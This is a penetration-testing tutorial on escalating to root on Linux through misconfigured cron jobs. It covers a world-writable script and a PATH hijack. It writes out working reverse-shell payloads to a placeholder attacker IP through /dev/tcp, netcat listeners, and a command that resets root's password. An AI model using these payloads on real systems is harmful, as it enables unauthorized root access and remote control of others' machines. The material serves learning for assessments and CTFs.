# Linux Privilege Escalation via Cron Jobs

## Overview

Cron jobs run scripts or binaries at scheduled times. By default, they execute with the privileges of their **owner**, not the current user. While a properly configured cron job isn't inherently vulnerable, misconfigurations can create a privilege escalation path.

**Key principle:** If a scheduled task runs with root privileges and you can modify the script it executes, your code runs as root.

Cron job configurations are stored in crontabs (cron tables), which show the schedule for each task.

Every user has their own crontab and can schedule tasks whether logged in or not. The goal in an assessment/CTF is to find a cron job owned by root that you can influence.

- `/etc/crontab` is world-readable — any user can view system-wide cron jobs.
- CTF machines often have jobs running every minute or every 5 minutes; real-world engagements are more likely to show daily/weekly/monthly jobs.

---

## 1. Exploiting a Writable Script Called by a Root Cron Job

### Step 1 — Read the system crontab

```bash
cat /etc/crontab
```

Example output:

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

* * * * * root /home/john/Desktop/backup.sh
```

Here, `backup.sh` runs every minute as root.

### Step 2 — Check permissions on the script

```bash
ls -la backup.sh
# -rwxrwxrwx 1 root root 142 Apr 28 14:23 backup.sh
```

World-writable → you can overwrite it.

### Step 3 — Replace the script with a reverse shell payload

```bash
#!/bin/bash
bash -i >& /dev/tcp/CONNECTION_IP/6666 0>&1
```

Notes:
- Command syntax depends on tools available on the target (e.g., `nc` on the target may not support `-e`).
- Prefer reverse shells over destructive alternatives to preserve system integrity during real engagements.

### Step 4 — Start a listener on the attacking machine

```bash
nc -nlvp 6666
```

Once the cron job fires, you receive a root shell:

```
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 2. Exploiting a Cron Job Pointing to a Deleted Script (PATH Hijack)

A common real-world scenario: a script referenced by a cron job is later deleted, but the cron entry itself is never cleaned up.

```bash
cat /etc/crontab
```

```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root antivirus.sh
```

```bash
locate antivirus.sh
# (no results — script doesn't exist)
```

Because `antivirus.sh` is referenced **without a full path**, cron resolves it using the directories listed in the `PATH` variable, in order. If any directory in that `PATH` is writable by your user (e.g., `/home/user` in the example above), you can drop a malicious script there with the matching name.

### Exploit

```bash
cat > /home/user/antivirus.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/CONNECTION_IP/7777 0>&1
EOF
chmod +x /home/user/antivirus.sh
```

Start a listener:

```bash
nc -nlvp 7777
```

When the cron job runs, you get a root shell:

```
id
uid=0(root) gid=0(root) groups=0(root)
```

### Alternative: change root's password directly

Instead of a reverse shell, you can add this line to the hijacked script:

```bash
echo "root:newpass" | chpasswd
```

Then simply:

```bash
su
# enter newpass
```

---

## 3. General Advice

- If you find an existing script tied to a cron job, take time to understand what it does and how it uses external tools — utilities like `tar`, `7z`, and `rsync` can sometimes be exploited via their **wildcard** handling features.
- Cron jobs aren't only in `/etc/crontab`. Also check:
  - `/etc/cron.d/` — drop-in crontab fragments (same format as `/etc/crontab`, includes user field), typically used by installed packages.
  - `/etc/cron.hourly/` — run once per hour.
  - `/etc/cron.daily/` — run once per day.
  - `/etc/cron.weekly/` — run once per week.
  - `/etc/cron.monthly/` — run once per month.
  - `/var/spool/cron/crontabs/` (Debian/Ubuntu) — per-user personal crontabs, one file per username.

---

## Quick Checklist

- [ ] `cat /etc/crontab` and check `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly,monthly}/`
- [ ] Check `/var/spool/cron/crontabs/` for other users' personal crontabs
- [ ] Identify jobs running as **root**
- [ ] Check write permissions on any referenced script (`ls -la`)
- [ ] If no full path is given, check whether any directory in `PATH` (from the crontab header) is writable
- [ ] Note run frequency — minute-level jobs are fastest to exploit, but daily/weekly jobs are common in real assessments (be patient, or trigger manually if possible)
- [ ] Prefer reverse shells over destructive payloads on real engagements
